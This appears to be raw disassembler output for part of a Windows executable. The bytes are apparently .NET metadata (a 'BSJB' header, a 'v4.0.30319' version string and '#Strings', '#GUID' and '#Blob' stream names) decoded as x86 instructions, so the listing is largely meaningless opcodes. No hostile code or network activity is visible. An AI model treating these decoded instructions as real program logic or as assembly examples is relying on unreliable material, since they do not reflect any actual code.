  409d6e:	ff                   	(bad)
  409d6f:	ff                   	(bad)
  409d70:	ff 2e                	ljmp   *(%esi)
  409d72:	93                   	xchg   %eax,%ebx
  409d73:	cb                   	lret
  409d74:	1c 1c                	sbb    $0x1c,%al
  409d76:	cb                   	lret
  409d77:	93                   	xchg   %eax,%ebx
  409d78:	2e 00 00             	add    %al,%cs:(%eax)
  409d7b:	00 42 53             	add    %al,0x53(%edx)
  409d7e:	4a                   	dec    %edx
  409d7f:	42                   	inc    %edx
  409d80:	01 00                	add    %eax,(%eax)
  409d82:	01 00                	add    %eax,(%eax)
  409d84:	00 00                	add    %al,(%eax)
  409d86:	00 00                	add    %al,(%eax)
  409d88:	0c 00                	or     $0x0,%al
  409d8a:	00 00                	add    %al,(%eax)
  409d8c:	76 34                	jbe    0x409dc2
  409d8e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  409d91:	33 30                	xor    (%eax),%esi
  409d93:	33 31                	xor    (%ecx),%esi
  409d95:	39 00                	cmp    %eax,(%eax)
  409d97:	00 00                	add    %al,(%eax)
  409d99:	00 04 00             	add    %al,(%eax,%eax,1)
  409d9c:	60                   	pusha
  409d9d:	00 00                	add    %al,(%eax)
  409d9f:	00 10                	add    %dl,(%eax)
  409da1:	07                   	pop    %es
  409da2:	00 00                	add    %al,(%eax)
  409da4:	23 7e 00             	and    0x0(%esi),%edi
  409da7:	00 70 07             	add    %dh,0x7(%eax)
  409daa:	00 00                	add    %al,(%eax)
  409dac:	0c 0c                	or     $0xc,%al
  409dae:	00 00                	add    %al,(%eax)
  409db0:	23 53 74             	and    0x74(%ebx),%edx
  409db3:	72 69                	jb     0x409e1e
  409db5:	6e                   	outsb  %ds:(%esi),(%dx)
  409db6:	67 73 00             	addr16 jae 0x409db9
  409db9:	00 00                	add    %al,(%eax)
  409dbb:	00 7c 13 00          	add    %bh,0x0(%ebx,%edx,1)
  409dbf:	00 10                	add    %dl,(%eax)
  409dc1:	00 00                	add    %al,(%eax)
  409dc3:	00 23                	add    %ah,(%ebx)
  409dc5:	47                   	inc    %edi
  409dc6:	55                   	push   %ebp
  409dc7:	49                   	dec    %ecx
  409dc8:	44                   	inc    %esp
  409dc9:	00 00                	add    %al,(%eax)
  409dcb:	00 8c 13 00 00 f8 02 	add    %cl,0x2f80000(%ebx,%edx,1)
  409dd2:	00 00                	add    %al,(%eax)
  409dd4:	23 42 6c             	and    0x6c(%edx),%eax
  409dd7:	6f                   	outsl  %ds:(%esi),(%dx)
  409dd8:	62 00                	bound  %eax,(%eax)
  409dda:	00 00                	add    %al,(%eax)
  409ddc:	00 00                	add    %al,(%eax)
  409dde:	00 00                	add    %al,(%eax)
  409de0:	02 00                	add    (%eax),%al
  409de2:	00 0a                	add    %cl,(%edx)
  409de4:	57                   	push   %edi
  409de5:	95                   	xchg   %eax,%ebp
  409de6:	02 28                	add    (%eax),%ch
  409de8:	09 00                	or     %eax,(%eax)
  409dea:	00 00                	add    %al,(%eax)
  409dec:	00 fa                	add    %bh,%dl
  409dee:	01 33                	add    %esi,(%ebx)
  409df0:	00 16                	add    %dl,(%esi)
  409df2:	c4 00                	les    (%eax),%eax
  409df4:	01 00                	add    %eax,(%eax)
  409df6:	00 00                	add    %al,(%eax)
  409df8:	26 00 00             	add    %al,%es:(%eax)
  409dfb:	00 11                	add    %dl,(%ecx)
  409dfd:	00 00                	add    %al,(%eax)
  409dff:	00 13                	add    %dl,(%ebx)
  409e01:	00 00                	add    %al,(%eax)
  409e03:	00 21                	add    %ah,(%ecx)
  409e05:	00 00                	add    %al,(%eax)
  409e07:	00 04 00             	add    %al,(%eax,%eax,1)
  409e0a:	00 00                	add    %al,(%eax)
  409e0c:	2b 00                	sub    (%eax),%eax
  409e0e:	00 00                	add    %al,(%eax)
  409e10:	0f 00 00             	sldt   (%eax)
  409e13:	00 0e                	add    %cl,(%esi)
  409e15:	00 00                	add    %al,(%eax)
  409e17:	00 15 00 00 00 02    	add    %dl,0x2000000
  409e1d:	00 00                	add    %al,(%eax)
  409e1f:	00 0e                	add    %cl,(%esi)
  409e21:	00 00                	add    %al,(%eax)
  409e23:	00 01                	add    %al,(%ecx)
  409e25:	00 00                	add    %al,(%eax)
  409e27:	00 02                	add    %al,(%edx)
  409e29:	00 00                	add    %al,(%eax)
  409e2b:	00 00                	add    %al,(%eax)
  409e2d:	00 93 05 01 00 00    	add    %dl,0x105(%ebx)
  409e33:	00 00                	add    %al,(%eax)
  409e35:	00 06                	add    %al,(%esi)
  409e37:	00 e8                	add    %ch,%al
  409e39:	02 3a                	add    (%edx),%bh
  409e3b:	07                   	pop    %es
  409e3c:	06                   	push   %es
  409e3d:	00 84 05 3a 07 06 00 	add    %al,0x6073a(%ebp,%eax,1)
  409e44:	ca 0a 3a             	lret   $0x3a0a
  409e47:	07                   	pop    %es
  409e48:	06                   	push   %es
  409e49:	00 01                	add    %al,(%ecx)
  409e4b:	00 3a                	add    %bh,(%edx)
  409e4d:	07                   	pop    %es
  409e4e:	06                   	push   %es
  409e4f:	00 07                	add    %al,(%edi)
  409e51:	00 3a                	add    %bh,(%edx)
  409e53:	07                   	pop    %es
  409e54:	06                   	push   %es
  409e55:	00 12                	add    %dl,(%edx)
  409e57:	08 3a                	or     %bh,(%edx)
  409e59:	07                   	pop    %es
  409e5a:	06                   	push   %es
  409e5b:	00 38                	add    %bh,(%eax)
  409e5d:	06                   	push   %es
  409e5e:	3a 07                	cmp    (%edi),%al
  409e60:	06                   	push   %es
  409e61:	00 c6                	add    %al,%dh
  409e63:	07                   	pop    %es
  409e64:	3a 07                	cmp    (%edi),%al
  409e66:	06                   	push   %es
  409e67:	00 31                	add    %dh,(%ecx)
  409e69:	0b 3a                	or     (%edx),%edi
  409e6b:	07                   	pop    %es
  409e6c:	06                   	push   %es
  409e6d:	00 b4 09 3a 07 06 00 	add    %dh,0x6073a(%ecx,%ecx,1)
  409e74:	b3 02                	mov    $0x2,%bl
  409e76:	ab                   	stos   %eax,%es:(%edi)
  409e77:	00 06                	add    %al,(%esi)
  409e79:	00 58 07             	add    %bl,0x7(%eax)
  409e7c:	3a 07                	cmp    (%edi),%al
  409e7e:	0a 00                	or     (%eax),%al
  409e80:	f3 07                	repz pop %es
  409e82:	bb 09 0a 00 a6       	mov    $0xa6000a09,%ebx
  409e87:	0a bb 09 06 00 6f    	or     0x6f000609(%ebx),%bh
  409e8d:	06                   	push   %es
  409e8e:	ab                   	stos   %eax,%es:(%edi)
  409e8f:	00 06                	add    %al,(%esi)
  409e91:	00 ba 07 ab 00 06    	add    %bh,0x600ab07(%edx)
  409e97:	00 5a 02             	add    %bl,0x2(%edx)
  409e9a:	3a 07                	cmp    (%edi),%al
  409e9c:	06                   	push   %es
  409e9d:	00 83 03 3a 07 06    	add    %al,0x6073a03(%ebx)
  409ea3:	00 3a                	add    %bh,(%edx)
  409ea5:	02 3a                	add    (%edx),%bh
  409ea7:	07                   	pop    %es
  409ea8:	06                   	push   %es
  409ea9:	00 c5                	add    %al,%ch
  409eab:	0b ab 00 06 00 04    	or     0x4000600(%ebx),%ebp
  409eb1:	08 ab 00 0a 00 c8    	or     %ch,-0x37fff600(%ebx)
  409eb7:	02 bb 09 06 00 41    	add    0x41000609(%ebx),%bh
  409ebd:	03 3a                	add    (%edx),%edi
  409ebf:	07                   	pop    %es
  409ec0:	06                   	push   %es
  409ec1:	00 e5                	add    %ah,%ch
  409ec3:	04 ed                	add    $0xed,%al
  409ec5:	09 06                	or     %eax,(%esi)
  409ec7:	00 52 05             	add    %dl,0x5(%edx)
  409eca:	ed                   	in     (%dx),%eax
  409ecb:	09 06                	or     %eax,(%esi)
  409ecd:	00 04 04             	add    %al,(%esp,%eax,1)
  409ed0:	bb 09 6b 00 0d       	mov    $0xd006b09,%ebx
  409ed5:	0a 00                	or     (%eax),%al
  409ed7:	00 06                	add    %al,(%esi)
  409ed9:	00 2c 04             	add    %ch,(%esp,%eax,1)
  409edc:	a8 07                	test   $0x7,%al
  409ede:	06                   	push   %es
  409edf:	00 c8                	add    %cl,%al
  409ee1:	04 a8                	add    $0xa8,%al
  409ee3:	07                   	pop    %es
  409ee4:	06                   	push   %es
  409ee5:	00 a9 04 a8 07 06    	add    %ch,0x607a804(%ecx)
  409eeb:	00 39                	add    %bh,(%ecx)
  409eed:	05 a8 07 06 00       	add    $0x607a8,%eax
  409ef2:	05 05 a8 07 06       	add    $0x607a805,%eax
  409ef7:	00 1e                	add    %bl,(%esi)
  409ef9:	05 a8 07 06 00       	add    $0x607a8,%eax
  409efe:	43                   	inc    %ebx
  409eff:	04 a8                	add    $0xa8,%al
  409f01:	07                   	pop    %es
  409f02:	06                   	push   %es
  409f03:	00 18                	add    %bl,(%eax)
  409f05:	04 ce                	add    $0xce,%al
  409f07:	09 06                	or     %eax,(%esi)
  409f09:	00 f6                	add    %dh,%dh
  409f0b:	03 ce                	add    %esi,%ecx
  409f0d:	09 06                	or     %eax,(%esi)
  409f0f:	00 8c 04 a8 07 06 00 	add    %cl,0x607a8(%esp,%eax,1)
  409f16:	5e                   	pop    %esi
  409f17:	04 fa                	add    $0xfa,%al
  409f19:	05 00 00 00 00       	add    $0x0,%eax
  409f1e:	29 00                	sub    %eax,(%eax)
  409f20:	00 00                	add    %al,(%eax)
  409f22:	00 00                	add    %al,(%eax)
  409f24:	01 00                	add    %eax,(%eax)
  409f26:	01 00                	add    %eax,(%eax)
  409f28:	00 00                	add    %al,(%eax)
  409f2a:	10 00                	adc    %al,(%eax)
  409f2c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  409f2d:	06                   	push   %es
  409f2e:	7e 02                	jle    0x409f32
  409f30:	0d 00 04 00 0b       	or     $0xb000400,%eax
  409f35:	00 11                	add    %dl,(%ecx)
  409f37:	01 00                	add    %eax,(%eax)
  409f39:	00 2a                	add    %ch,(%edx)
  409f3b:	03 00                	add    (%eax),%eax
  409f3d:	00 5d 00             	add    %bl,0x0(%ebp)
  409f40:	05 00 22 00 11       	add    $0x11002200,%eax
  409f45:	01 00                	add    %eax,(%eax)
  409f47:	00 91 07 00 00 5d    	add    %dl,0x5d000007(%ecx)
  409f4d:	00 06                	add    %al,(%esi)
  409f4f:	00 22                	add    %ah,(%edx)
  409f51:	00 11                	add    %dl,(%ecx)
  409f53:	01 00                	add    %eax,(%eax)
  409f55:	00 88 06 00 00 5d    	add    %cl,0x5d000006(%eax)
  409f5b:	00 07                	add    %al,(%edi)
  409f5d:	00 22                	add    %ah,(%edx)
  409f5f:	00 11                	add    %dl,(%ecx)
  409f61:	01 00                	add    %eax,(%eax)
  409f63:	00 ac 01 00 00 5d 00 	add    %ch,0x5d0000(%ecx,%eax,1)
  409f6a:	08 00                	or     %al,(%eax)
  409f6c:	22 00                	and    (%eax),%al
  409f6e:	11 01                	adc    %eax,(%ecx)
  409f70:	00 00                	add    %al,(%eax)
  409f72:	9b                   	fwait
  409f73:	00 00                	add    %al,(%eax)
  409f75:	00 5d 00             	add    %bl,0x0(%ebp)
  409f78:	09 00                	or     %eax,(%eax)
  409f7a:	22 00                	and    (%eax),%al
  409f7c:	11 01                	adc    %eax,(%ecx)
  409f7e:	00 00                	add    %al,(%eax)
  409f80:	3d 0b 00 00 5d       	cmp    $0x5d00000b,%eax
  409f85:	00 0a                	add    %cl,(%edx)
  409f87:	00 22                	add    %ah,(%edx)
  409f89:	00 11                	add    %dl,(%ecx)
  409f8b:	01 00                	add    %eax,(%eax)
  409f8d:	00 0a                	add    %cl,(%edx)
  409f8f:	0b 00                	or     (%eax),%eax
  409f91:	00 5d 00             	add    %bl,0x0(%ebp)
  409f94:	0b 00                	or     (%eax),%eax
  409f96:	22 00                	and    (%eax),%al
  409f98:	11 01                	adc    %eax,(%ecx)
  409f9a:	00 00                	add    %al,(%eax)
  409f9c:	41                   	inc    %ecx
  409f9d:	07                   	pop    %es
  409f9e:	00 00                	add    %al,(%eax)
  409fa0:	5d                   	pop    %ebp
  409fa1:	00 0c 00             	add    %cl,(%eax,%eax,1)
  409fa4:	22 00                	and    (%eax),%al
  409fa6:	11 01                	adc    %eax,(%ecx)
  409fa8:	00 00                	add    %al,(%eax)
  409faa:	32 00                	xor    (%eax),%al
  409fac:	00 00                	add    %al,(%eax)
  409fae:	5d                   	pop    %ebp
  409faf:	00 0d 00 22 00 11    	add    %cl,0x11002200
  409fb5:	01 00                	add    %eax,(%eax)
  409fb7:	00 cf                	add    %cl,%bh
  409fb9:	03 00                	add    (%eax),%eax
  409fbb:	00 5d 00             	add    %bl,0x0(%ebp)
  409fbe:	0e                   	push   %cs
  409fbf:	00 22                	add    %ah,(%edx)
  409fc1:	00 11                	add    %dl,(%ecx)
  409fc3:	01 00                	add    %eax,(%eax)
  409fc5:	00 63 06             	add    %ah,0x6(%ebx)
  409fc8:	00 00                	add    %al,(%eax)
  409fca:	5d                   	pop    %ebp
  409fcb:	00 0f                	add    %cl,(%edi)
  409fcd:	00 22                	add    %ah,(%edx)
  409fcf:	00 11                	add    %dl,(%ecx)
  409fd1:	01 00                	add    %eax,(%eax)
  409fd3:	00 d1                	add    %dl,%cl
  409fd5:	0a 00                	or     (%eax),%al
  409fd7:	00 5d 00             	add    %bl,0x0(%ebp)
  409fda:	10 00                	adc    %al,(%eax)
  409fdc:	22 00                	and    (%eax),%al
  409fde:	11 01                	adc    %eax,(%ecx)
  409fe0:	00 00                	add    %al,(%eax)
  409fe2:	8c 08                	mov    %cs,(%eax)
  409fe4:	00 00                	add    %al,(%eax)
  409fe6:	5d                   	pop    %ebp
  409fe7:	00 11                	add    %dl,(%ecx)
  409fe9:	00 22                	add    %ah,(%edx)
  409feb:	00 11                	add    %dl,(%ecx)
  409fed:	01 00                	add    %eax,(%eax)
  409fef:	00 52 01             	add    %dl,0x1(%edx)
  409ff2:	00 00                	add    %al,(%eax)
  409ff4:	5d                   	pop    %ebp
  409ff5:	00 12                	add    %dl,(%edx)
  409ff7:	00 22                	add    %ah,(%edx)
  409ff9:	00 01                	add    %al,(%ecx)
  409ffb:	00 00                	add    %al,(%eax)
  409ffd:	00 14 06             	add    %dl,(%esi,%eax,1)
  40a000:	00 00                	add    %al,(%eax)
  40a002:	0d 00 13 00 22       	or     $0x22001300,%eax
  40a007:	00 16                	add    %dl,(%esi)
  40a009:	00 35 08 0a 00 11    	add    %dh,0x11000a08
  40a00f:	00 99 09 0d 00 11    	add    %bl,0x11000d09(%ecx)
  40a015:	00 34 0a             	add    %dh,(%edx,%ecx,1)
  40a018:	11 00                	adc    %eax,(%eax)
  40a01a:	11 00                	adc    %eax,(%eax)
  40a01c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a01d:	08 11                	or     %dl,(%ecx)
  40a01f:	00 33                	add    %dh,(%ebx)
  40a021:	01 d0                	add    %edx,%eax
  40a023:	07                   	pop    %es
  40a024:	ad                   	lods   %ds:(%esi),%eax
  40a025:	01 33                	add    %esi,(%ebx)
  40a027:	01 46 02             	add    %eax,0x2(%esi)
  40a02a:	b1 01                	mov    $0x1,%cl
  40a02c:	33 01                	xor    (%ecx),%eax
  40a02e:	98                   	cwtl
  40a02f:	0a b5 01 33 01 90    	or     -0x6ffeccff(%ebp),%dh
  40a035:	01 b9 01 33 01 5c    	add    %edi,0x5c013301(%ecx)
  40a03b:	03 bd 01 33 01 b7    	add    -0x48feccff(%ebp),%edi
  40a041:	05 c1 01 33 01       	add    $0x13301c1,%eax
  40a046:	56                   	push   %esi
  40a047:	09 c5                	or     %eax,%ebp
  40a049:	01 33                	add    %esi,(%ebx)
  40a04b:	01 74 0a c9          	add    %esi,-0x37(%edx,%ecx,1)
  40a04f:	01 33                	add    %esi,(%ebx)
  40a051:	01 9f 05 cd 01 33    	add    %ebx,0x3301cd05(%edi)
  40a057:	01 cf                	add    %ecx,%edi
  40a059:	0b d1                	or     %ecx,%edx
  40a05b:	01 33                	add    %esi,(%ebx)
  40a05d:	01 77 04             	add    %esi,0x4(%edi)
  40a060:	d5 01                	aad    $0x1
  40a062:	33 01                	xor    (%ecx),%eax
  40a064:	e1 05                	loope  0x40a06b
  40a066:	d9 01                	flds   (%ecx)
  40a068:	33 01                	xor    (%ecx),%eax
  40a06a:	ea 00 dd 01 33 01 e6 	ljmp   $0xe601,$0x3301dd00
  40a071:	07                   	pop    %es
  40a072:	e1 01                	loope  0x40a075
  40a074:	10 00                	adc    %al,(%eax)
  40a076:	0d 00 e5 01 50       	or     $0x5001e500,%eax
  40a07b:	20 00                	and    %al,(%eax)
  40a07d:	00 00                	add    %al,(%eax)
  40a07f:	00 10                	add    %dl,(%eax)
  40a081:	18 92 09 73 00 01    	sbb    %dl,0x1007309(%edx)
  40a087:	00 e4                	add    %ah,%ah
  40a089:	2f                   	das
  40a08a:	00 00                	add    %al,(%eax)
  40a08c:	00 00                	add    %al,(%eax)
  40a08e:	16                   	push   %ss
  40a08f:	00 8e 00 32 00 01    	add    %cl,0x1003200(%esi)
  40a095:	00 eb                	add    %ch,%bl
  40a097:	2f                   	das
  40a098:	00 00                	add    %al,(%eax)
  40a09a:	00 00                	add    %al,(%eax)
  40a09c:	11 00                	adc    %eax,(%eax)
  40a09e:	15 09 37 00 01       	adc    $0x1003709,%eax
  40a0a3:	00 fb                	add    %bh,%bl
  40a0a5:	2f                   	das
  40a0a6:	00 00                	add    %al,(%eax)
  40a0a8:	00 00                	add    %al,(%eax)
  40a0aa:	16                   	push   %ss
  40a0ab:	00 e4                	add    %ah,%ah
  40a0ad:	01 41 00             	add    %eax,0x0(%ecx)
  40a0b0:	01 00                	add    %eax,(%eax)
  40a0b2:	06                   	push   %es
  40a0b3:	30 00                	xor    %al,(%eax)
  40a0b5:	00 00                	add    %al,(%eax)
  40a0b7:	00 11                	add    %dl,(%ecx)
  40a0b9:	00 6a 09             	add    %ch,0x9(%edx)
  40a0bc:	4b                   	dec    %ebx
  40a0bd:	00 01                	add    %al,(%ecx)
  40a0bf:	00 0d 30 00 00 00    	add    %cl,0x30
  40a0c5:	00 16                	add    %dl,(%esi)
  40a0c7:	00 36                	add    %dh,(%esi)
  40a0c9:	01 58 00             	add    %ebx,0x0(%eax)
  40a0cc:	01 00                	add    %eax,(%eax)
  40a0ce:	18 30                	sbb    %dh,(%eax)
  40a0d0:	00 00                	add    %al,(%eax)
  40a0d2:	00 00                	add    %al,(%eax)
  40a0d4:	16                   	push   %ss
  40a0d5:	00 74 06 5e          	add    %dh,0x5e(%esi,%eax,1)
  40a0d9:	00 01                	add    %al,(%ecx)
  40a0db:	00 23                	add    %ah,(%ebx)
  40a0dd:	30 00                	xor    %al,(%eax)
  40a0df:	00 00                	add    %al,(%eax)
  40a0e1:	00 11                	add    %dl,(%ecx)
  40a0e3:	00 ba 03 63 00 01    	add    %bh,0x1006303(%edx)
  40a0e9:	00 2a                	add    %ch,(%edx)
  40a0eb:	30 00                	xor    %al,(%eax)
  40a0ed:	00 00                	add    %al,(%eax)
  40a0ef:	00 16                	add    %dl,(%esi)
  40a0f1:	00 9b 01 6d 00 01    	add    %bl,0x1006d01(%ebx)
  40a0f7:	00 38                	add    %bh,(%eax)
  40a0f9:	30 00                	xor    %al,(%eax)
  40a0fb:	00 00                	add    %al,(%eax)
  40a0fd:	00 11                	add    %dl,(%ecx)
  40a0ff:	00 0e                	add    %cl,(%esi)
  40a101:	07                   	pop    %es
  40a102:	73 00                	jae    0x40a104
  40a104:	01 00                	add    %eax,(%eax)
  40a106:	dc 30                	fdivl  (%eax)
  40a108:	00 00                	add    %al,(%eax)
  40a10a:	00 00                	add    %al,(%eax)
  40a10c:	11 00                	adc    %eax,(%eax)
  40a10e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40a10f:	0b 90 00 01 00 44    	or     0x44000100(%eax),%edx
  40a115:	31 00                	xor    %eax,(%eax)
  40a117:	00 00                	add    %al,(%eax)
  40a119:	00 11                	add    %dl,(%ecx)
  40a11b:	00 a5 02 90 00 01    	add    %ah,0x1009002(%ebp)
  40a121:	00 6c 31 00          	add    %ch,0x0(%ecx,%esi,1)
  40a125:	00 00                	add    %al,(%eax)
  40a127:	00 11                	add    %dl,(%ecx)
  40a129:	00 24 02             	add    %ah,(%edx,%eax,1)
  40a12c:	ad                   	lods   %ds:(%esi),%eax
  40a12d:	00 01                	add    %al,(%ecx)
  40a12f:	00 8c 31 00 00 00 00 	add    %cl,0x0(%ecx,%esi,1)
  40a136:	11 00                	adc    %eax,(%eax)
  40a138:	c9                   	leave
  40a139:	01 90 00 01 00 a4    	add    %edx,-0x5bffff00(%eax)
  40a13f:	31 00                	xor    %eax,(%eax)
  40a141:	00 00                	add    %al,(%eax)
  40a143:	00 11                	add    %dl,(%ecx)
  40a145:	00 b5 00 90 00 01    	add    %dh,0x1009000(%ebp)
  40a14b:	00 c8                	add    %cl,%al
  40a14d:	31 00                	xor    %eax,(%eax)
  40a14f:	00 00                	add    %al,(%eax)
  40a151:	00 11                	add    %dl,(%ecx)
  40a153:	00 88 03 c9 00 01    	add    %cl,0x100c903(%eax)
  40a159:	00 ec                	add    %ch,%ah
  40a15b:	31 00                	xor    %eax,(%eax)
  40a15d:	00 00                	add    %al,(%eax)
  40a15f:	00 11                	add    %dl,(%ecx)
  40a161:	00 df                	add    %bl,%bh
  40a163:	06                   	push   %es
  40a164:	ad                   	lods   %ds:(%esi),%eax
  40a165:	00 01                	add    %al,(%ecx)
  40a167:	00 14 37             	add    %dl,(%edi,%esi,1)
  40a16a:	00 00                	add    %al,(%eax)
  40a16c:	00 00                	add    %al,(%eax)
  40a16e:	11 00                	adc    %eax,(%eax)
  40a170:	55                   	push   %ebp
  40a171:	00 90 00 01 00 3c    	add    %dl,0x3c000100(%eax)
  40a177:	3b 00                	cmp    (%eax),%eax
  40a179:	00 00                	add    %al,(%eax)
  40a17b:	00 11                	add    %dl,(%ecx)
  40a17d:	00 cb                	add    %cl,%bl
  40a17f:	08 90 00 01 00 84    	or     %dl,-0x7bffff00(%eax)
  40a185:	3b 00                	cmp    (%eax),%eax
  40a187:	00 00                	add    %al,(%eax)
  40a189:	00 91 00 eb 0b 3a    	add    %dl,0x3a0beb00(%ecx)
  40a18f:	01 01                	add    %eax,(%ecx)
  40a191:	00 f8                	add    %bh,%al
  40a193:	47                   	inc    %edi
  40a194:	00 00                	add    %al,(%eax)
  40a196:	00 00                	add    %al,(%eax)
  40a198:	11 00                	adc    %eax,(%eax)
  40a19a:	27                   	daa
  40a19b:	01 90 00 04 00 50    	add    %edx,0x50000400(%eax)
  40a1a1:	4b                   	dec    %ebx
  40a1a2:	00 00                	add    %al,(%eax)
  40a1a4:	00 00                	add    %al,(%eax)
  40a1a6:	11 00                	adc    %eax,(%eax)
  40a1a8:	fe 00                	incb   (%eax)
  40a1aa:	ad                   	lods   %ds:(%esi),%eax
  40a1ab:	00 04 00             	add    %al,(%eax,%eax,1)
  40a1ae:	94                   	xchg   %eax,%esp
  40a1af:	4b                   	dec    %ebx
  40a1b0:	00 00                	add    %al,(%eax)
  40a1b2:	00 00                	add    %al,(%eax)
  40a1b4:	91                   	xchg   %eax,%ecx
  40a1b5:	00 f9                	add    %bh,%cl
  40a1b7:	02 7a 01             	add    0x1(%edx),%bh
  40a1ba:	04 00                	add    $0x0,%al
  40a1bc:	94                   	xchg   %eax,%esp
  40a1bd:	56                   	push   %esi
  40a1be:	00 00                	add    %al,(%eax)
  40a1c0:	00 00                	add    %al,(%eax)
  40a1c2:	11 00                	adc    %eax,(%eax)
  40a1c4:	ff 01                	incl   (%ecx)
  40a1c6:	ad                   	lods   %ds:(%esi),%eax
  40a1c7:	00 05 00 f4 56 00    	add    %al,0x56f400
  40a1cd:	00 00                	add    %al,(%eax)
  40a1cf:	00 11                	add    %dl,(%ecx)
  40a1d1:	00 7c 00 90          	add    %bh,-0x70(%eax,%eax,1)
  40a1d5:	00 05 00 0c 57 00    	add    %al,0x570c00
  40a1db:	00 00                	add    %al,(%eax)
  40a1dd:	00 11                	add    %dl,(%ecx)
  40a1df:	00 57 08             	add    %dl,0x8(%edi)
  40a1e2:	90                   	nop
  40a1e3:	00 05 00 24 57 00    	add    %al,0x572400
  40a1e9:	00 00                	add    %al,(%eax)
  40a1eb:	00 86 18 8c 09 c5    	add    %al,-0x3af673e8(%esi)
  40a1f1:	00 05 00 5c 57 00    	add    %al,0x575c00
  40a1f7:	00 00                	add    %al,(%eax)
  40a1f9:	00 11                	add    %dl,(%ecx)
  40a1fb:	00 17                	add    %dl,(%edi)
  40a1fd:	08 90 00 05 00 84    	or     %dl,-0x7bfffb00(%eax)
  40a203:	57                   	push   %edi
  40a204:	00 00                	add    %al,(%eax)
  40a206:	00 00                	add    %al,(%eax)
  40a208:	11 00                	adc    %eax,(%eax)
  40a20a:	60                   	pusha
  40a20b:	07                   	pop    %es
  40a20c:	90                   	nop
  40a20d:	00 05 00 28 5c 00    	add    %al,0x5c2800
  40a213:	00 00                	add    %al,(%eax)
  40a215:	00 11                	add    %dl,(%ecx)
  40a217:	00 5c 0a 90          	add    %bl,-0x70(%edx,%ecx,1)
  40a21b:	00 05 00 90 5c 00    	add    %al,0x5c9000
  40a221:	00 00                	add    %al,(%eax)
  40a223:	00 11                	add    %dl,(%ecx)
  40a225:	00 1c 0a             	add    %bl,(%edx,%ecx,1)
  40a228:	90                   	nop
  40a229:	00 05 00 c4 5c 00    	add    %al,0x5cc400
  40a22f:	00 00                	add    %al,(%eax)
  40a231:	00 10                	add    %dl,(%eax)
  40a233:	18 92 09 73 00 05    	sbb    %dl,0x5007309(%edx)
  40a239:	00 d8                	add    %bl,%al
  40a23b:	5c                   	pop    %esp
  40a23c:	00 00                	add    %al,(%eax)
  40a23e:	00 00                	add    %al,(%eax)
  40a240:	11 00                	adc    %eax,(%eax)
  40a242:	c1 06 73             	roll   $0x73,(%esi)
  40a245:	00 05 00 00 00 01    	add    %al,0x1000000
  40a24b:	00 89 05 00 00 02    	add    %cl,0x2000005(%ecx)
  40a251:	00 5b 06             	add    %bl,0x6(%ebx)
  40a254:	00 00                	add    %al,(%eax)
  40a256:	03 00                	add    (%eax),%eax
  40a258:	7f 08                	jg     0x40a262
  40a25a:	00 00                	add    %al,(%eax)
  40a25c:	01 00                	add    %eax,(%eax)
  40a25e:	4d                   	dec    %ebp
  40a25f:	0a 09                	or     (%ecx),%cl
  40a261:	00 89 0b 32 00 09    	add    %cl,0x900320b(%ecx)
  40a267:	00 52 0a             	add    %dl,0xa(%edx)
  40a26a:	77 00                	ja     0x40a26c
  40a26c:	39 00                	cmp    %eax,(%eax)
  40a26e:	8c 09                	mov    %cs,(%ecx)
  40a270:	7b 00                	jnp    0x40a272
  40a272:	49                   	dec    %ecx
  40a273:	00 5d 0b             	add    %bl,0xb(%ebp)
  40a276:	5e                   	pop    %esi
  40a277:	00 41 00             	add    %al,0x0(%ecx)
  40a27a:	8c 09                	mov    %cs,(%ecx)
  40a27c:	81 00 59 00 bc 0a    	addl   $0xabc0059,(%eax)
  40a282:	8b 00                	mov    (%eax),%eax
  40a284:	19 00                	sbb    %eax,(%eax)
  40a286:	8c 09                	mov    %cs,(%ecx)
  40a288:	c5 00                	lds    (%eax),%eax
  40a28a:	79 00                	jns    0x40a28c
  40a28c:	4f                   	dec    %edi
  40a28d:	06                   	push   %es
  40a28e:	de 00                	fiadds (%eax)
  40a290:	79 00                	jns    0x40a292
  40a292:	f1                   	int1
  40a293:	02 e2                	add    %dl,%ah
  40a295:	00 79 00             	add    %bh,0x0(%ecx)
  40a298:	f1                   	int1
  40a299:	02 e8                	add    %al,%ch
  40a29b:	00 39                	add    %bh,(%ecx)
  40a29d:	00 c3                	add    %al,%bl
  40a29f:	0a e2                	or     %dl,%ah
  40a2a1:	00 81 00 8c 09 81    	add    %al,-0x7ef67400(%ecx)
  40a2a7:	00 91 00 6c 02 2e    	add    %dl,0x2e026c00(%ecx)
  40a2ad:	01 91 00 4b 03 35    	add    %edx,0x35034b00(%ecx)
  40a2b3:	01 99 00 b2 03 c5    	add    %ebx,-0x3afc4e00(%ecx)
  40a2b9:	00 a1 00 bf 0b 8f    	add    %ah,-0x70f44100(%ecx)
  40a2bf:	01 39                	add    %edi,(%ecx)
  40a2c1:	00 c3                	add    %al,%bl
  40a2c3:	0a 95 01 69 00 8c    	or     -0x73ff96ff(%ebp),%dl
  40a2c9:	09 c5                	or     %eax,%ebp
  40a2cb:	00 69 00             	add    %ch,0x0(%ecx)
  40a2ce:	db 02                	fildl  (%edx)
  40a2d0:	81 00 69 00 ae 0a    	addl   $0xaae0069,(%eax)
  40a2d6:	81 00 69 00 70 05    	addl   $0x5700069,(%eax)
  40a2dc:	9b                   	fwait
  40a2dd:	01 69 00             	add    %ebp,0x0(%ecx)
  40a2e0:	94                   	xchg   %eax,%esp
  40a2e1:	0b 9b 01 69 00 b8    	or     -0x47ff96ff(%ebx),%ebx
  40a2e7:	02 a0 01 69 00 6e    	add    0x6e006901(%eax),%ah
  40a2ed:	0b 9b 01 69 00 3c    	or     0x3c006901(%ebx),%ebx
  40a2f3:	09 9b 01 69 00 3f    	or     %ebx,0x3f006901(%ebx)
  40a2f9:	06                   	push   %es
  40a2fa:	9b                   	fwait
  40a2fb:	01 71 00             	add    %esi,0x0(%ecx)
  40a2fe:	57                   	push   %edi
  40a2ff:	0b a6 01 71 00 fe    	or     -0x1ff8eff(%esi),%esp
  40a305:	0a c5                	or     %ch,%al
  40a307:	00 c1                	add    %al,%cl
  40a309:	00 8c 09 e8 01 c9 00 	add    %cl,0xc901e8(%ecx,%ecx,1)
  40a310:	8c 09                	mov    %cs,(%ecx)
  40a312:	c5 00                	lds    (%eax),%eax
  40a314:	d1 00                	roll   $1,(%eax)
  40a316:	8c 09                	mov    %cs,(%ecx)
